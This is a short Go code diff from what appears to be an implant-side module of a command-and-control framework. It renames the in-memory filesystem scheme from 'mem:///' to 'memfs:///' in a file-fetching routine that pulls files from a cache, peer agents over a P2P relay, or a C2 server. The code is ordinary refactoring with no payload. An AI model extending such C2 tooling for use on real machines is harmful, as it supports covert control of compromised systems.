@@ -46,9 +46,9 @@ var (
 )
 
 // MemFSKey returns the canonical memfs key for a named resource.
-// e.g. "/tmp/sa_whoami" and "sa_whoami" both map to "mem:///sa_whoami".
+// e.g. "/tmp/sa_whoami" and "sa_whoami" both map to "memfs:///sa_whoami".
 func MemFSKey(name string) string {
-	return "mem:///" + filepath.Base(name)
+	return "memfs:///" + filepath.Base(name)
 }
 
 // cacheToMemFS stores data in memfs under the canonical key for name.
@@ -64,8 +64,8 @@ func cacheToMemFS(name string, data []byte) {
 
 // FetchFile is the single entry point for file acquisition.
 // Priority order:
-//  1. memfs cache (mem:///basename) — checked first, checksum-verified
-//  2. explicit destination path (disk or mem:///)
+//  1. memfs cache (memfs:///basename) — checked first, checksum-verified
+//  2. explicit destination path (disk or memfs:///)
 //  3. peer agent via P2P relay (query gossip view for peers advertising the file)
 //  4. C2 server (last resort)
 //
@@ -104,7 +104,7 @@ func FetchFile(config *def.Config, peer, file_to_download, path, checksum string
 		}
 	}
 
-	// 1c. Check explicit destination path (disk or mem:///)
+	// 1c. Check explicit destination path (disk or memfs:///)
 	if path != "" && path != file_to_download && util.IsFileExist(path) {
 		if existing, rerr := util.ReadFileAgent(path); rerr == nil {
 			if checksum == "" || crypto.SHA256SumRaw(existing) == checksum {
@@ -180,7 +180,7 @@ func DownloadViaC2(config *def.Config, file_to_download, path, checksum string) 
 	retData := path == ""
 
 	// Lock file for non-mem disk paths to prevent concurrent downloads
-	if !retData && !strings.HasPrefix(path, "mem:") {
+	if !retData && !util.IsMemPath(path) {
 		lock := fmt.Sprintf("%s.lock", path)
 		if util.IsFileExist(lock) {
 			return nil, fmt.Errorf("DownloadViaC2: %s is already being downloaded", file_to_download)
